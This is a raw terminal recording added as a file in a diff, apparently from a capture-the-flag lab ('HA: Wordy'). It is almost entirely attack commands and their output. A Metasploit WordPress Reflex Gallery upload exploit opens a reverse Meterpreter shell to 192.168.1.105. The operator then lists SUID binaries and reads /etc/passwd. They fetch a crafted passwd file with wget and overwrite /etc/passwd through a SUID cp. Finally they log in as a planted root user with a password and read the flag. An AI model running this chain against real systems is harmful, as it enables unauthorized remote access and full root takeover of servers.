@@ -1,0 +1,365 @@
+Script started on 2020-09-29 17:25:49-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="169" LINES="32"]
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# use 
+bash: use: comando não encontrado
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# find / -perm -u=s -type f 2>/dev/null
+/opt/VBoxGuestAdditions-6.1.14/bin/VBoxDRMClient
+^C
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# clear
+[H[2J[3J]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# msfconsole
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-                                                  
+[0m[36m[0m[37m
+  Metasploit Park, System Security Interface
+  Version 4.0.5, Alpha E
+  Ready...
+  > [1maccess security[0m
+  access: PERMISSION DENIED.
+  > [1maccess security grid[0m
+  access: PERMISSION DENIED.
+  > [1maccess main security grid[0m
+  access: PERMISSION DENIED....and...
+  [31mYOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD![0m
+[0m
+
+       =[ [33mmetasploit v5.0.101-dev[0m                         ]
++ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Adapter names can be used for IP params [32mset LHOST eth0[0m
+
+[?1034h[4mmsf5[0m [0m> use 
+[0mUsage: use <name|term|index>
+
+Interact with a module by name or search term/index.
+If a module name is not found, it will be treated as a search term.
+An index from the previous search results can be selected if desired.
+
+Examples:
+  use exploit/windows/smb/ms17_010_eternalblue
+
+  use eternalblue
+  use <name|index>
+
+  search eternalblue
+  use <name|index>
+
+[4mmsf5[0m [0m> find / -perm -u=s -type f 2>/dev/null
+[0m[1m[34m[*][0m exec: find / -perm -u=s -type f 2>/dev/null
+
+/opt/VBoxGuestAdditions-6.1.14/bin/VBoxDRMClient
+^CInterrupt: use the 'exit' command to quit
+[4mmsf5[0m [0m> c[Kclcear
+[0m[1m[31m[-][0m Unknown command: clcear.
+[4mmsf5[0m [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[H[2J[3J[4mmsf5[0m [0m> use unix/webapp/wp_reflexgallery_file_upload
+[0m[1m[34m[*][0m No payload configured, defaulting to php/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> options
+[0m
+Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Reflex Gallery 3.1.3
+
+
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> set hrhosts[K[K[K[K[K[Khor[K[K[K[Khhost[K[K[K[Kh[Khosts[K[K[K[K[Kros[K[K[K[Krhosts 192.168.1.1[K104
+[0mrhosts => 192.168.1.104
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> set r[Ktargeturi /wordpress
+[0mtargeturi => /wordpress
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
+[1m[32m[+][0m Our payload is at: TWPDZdEy.php. Calling payload...
+[1m[34m[*][0m Calling payload...
+[1m[34m[*][0m Sending stage (38288 bytes) to 192.168.1.104
+[1m[34m[*][0m Meterpreter session 1 opened (192.168.1.105:443 -> 192.168.1.104:55880) at 2020-09-29 17:28:17 -0300
+[0m[1m[32m[+][0m Deleted TWPDZdEy.php
+
+[0m[4mmeterpreter[0m > shell
+[0mProcess 2531 created.
+Channel 0 created.
+python3 'import pty;pty.spawn("/bin/bash")'
+python3: can't open file 'import pty;pty.spawn("/bin/bash")': [Errno 2] No such file or directory
+p^[[A     python  3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ cd /home/
+cd /home/
+www-data@ubuntu:/home$ ls
+ls
+raj
+www-data@ubuntu:/home$ cd raj
+cd raj
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ ls
+ls
+Desktop    Downloads  Pictures	Templates  examples.desktop  plugin
+Documents  Music      Public	Videos	   flag1.txt
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ cat flag1.txt
+cat flag1.txt
+aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/pppd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/arping
+/usr/bin/wget
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/cp
+/bin/su
+/snap/core18/1885/bin/mount
+/snap/core18/1885/bin/ping
+/snap/core18/1885/bin/su
+/snap/core18/1885/bin/umount
+/snap/core18/1885/usr/bin/chfn
+/snap/core18/1885/usr/bin/chsh
+/snap/core18/1885/usr/bin/gpasswd
+/snap/core18/1885/usr/bin/newgrp
+/snap/core18/1885/usr/bin/passwd
+/snap/core18/1885/usr/bin/sudo
+/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1885/usr/lib/openssh/ssh-keysign
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+/snap/core/9993/bin/mount
+/snap/core/9993/bin/ping
+/snap/core/9993/bin/ping6
+/snap/core/9993/bin/su
+/snap/core/9993/bin/umount
+/snap/core/9993/usr/bin/chfn
+/snap/core/9993/usr/bin/chsh
+/snap/core/9993/usr/bin/gpasswd
+/snap/core/9993/usr/bin/newgrp
+/snap/core/9993/usr/bin/passwd
+/snap/core/9993/usr/bin/sudo
+/snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9993/usr/lib/openssh/ssh-keysign
+/snap/core/9993/usr/lib/snapd/snap-confine
+/snap/core/9993/usr/sbin/pppd
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ 
+
+www-data@ubuntu:/home/raj$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+whoopsie:x:112:117::/nonexistent:/bin/false
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
+pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
+gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
+mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
+www-data@ubuntu:/home/raj$ sudo su
+sudo su
+[sudo] password for www-data: ^C
+Terminate channel 0? [y/N]  n
+[1m[31m[-][0m core_channel_interact: Operation failed: 1
+[4mmeterpreter[0m > shell
+[0mProcess 2648 created.
+Channel 1 created.
+^[[A^[[A        python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ clear
+clear
+TERM environment variable not set.
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ 
+
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ cm d /tmp
+cd /tmp
+www-data@ubuntu:/tmp$ l
+l
+l: command not found
+www-data@ubuntu:/tmp$ ls
+ls
+www-data@ubuntu:/tmp$ wget http://192.168.1.105/passwd
+wget http://192.168.1.105/passwd
+--2020-09-29 13:51:35--  http://192.168.1.105/passwd
+Connecting to 192.168.1.105:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2563 (2.5K)
+Saving to: 'passwd'
+
+passwd                0%[                    ]       0  --.-KB/s               passwd              100%[===================>]   2.50K  --.-KB/s    in 0s      
+
+2020-09-29 13:51:35 (27.1 MB/s) - 'passwd' saved [2563/2563]
+
+www-data@ubuntu:/tmp$ ls
+ls
+passwd
+www-data@ubuntu:/tmp$ cp pass	/etc           cp /etc    passwd /etc/passwd
+cp passwd /etc/passwd
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ sud  spij ke
+su spike
+Password: 13371337
+
+root@ubuntu:/tmp# 
+
+root@ubuntu:/tmp# cd /root
+cd /root
+root@ubuntu:~# ls
+ls
+proof.txt
+root@ubuntu:~# cat pto  ro	of	.txt
+cat proof.txt
+_________________________________________________________________________
+ _____     _   _   U _____ u     U _____ u   _   _       ____     	|	
+ |_ " _|   |'| |'|  \| ___"|/     \| ___"|/  | \ |"|     |  _"\   	|
+   | |    /| |_| |\  |  _|"        |  _|"   <|  \| |>   /| | | |  	|	
+  /| |\   U|  _  |u  | |___        | |___   U| |\  |u   U| |_| |\ 	|
+ u |_|U    |_| |_|   |_____|       |_____|   |_| \_|     |____/ u 	|
+ _// \\_   //   \\   <<   >>       <<   >>   ||   \\,-.   |||_    	|
+(__) (__) (_") ("_) (__) (__)     (__) (__)  (_")  (_/   (__)_)   	|
+									|
+									|
+!! Congrats you have finished this task !!				|
+									|
+Contact us here:							|
+									|
+Hacking Articles : https://twitter.com/rajchandel/			|
+									|
+									|
++-+-+-+-+-+ +-+-+-+-+-+-+-+						|
+ |E|n|j|o|y| |H|A|C|K|I|N|G|						|
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+						|
+________________________________________________________________________|
+
+                                                
+
+root@ubuntu:~# hostna,e  me
+hostname
+ubuntu
+root@ubuntu:~# exit
+exit
+exit
+www-data@ubuntu:/tmp$ exit
+exit
+exit
+exit
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 192.168.1.104 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31munix/webapp/wp_reflexgallery_file_upload[0m) [0m> exit
+[0m]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# exit
+exit
+
+Script done on 2020-09-29 17:56:16-03:00 [COMMAND_EXIT_CODE="0"]
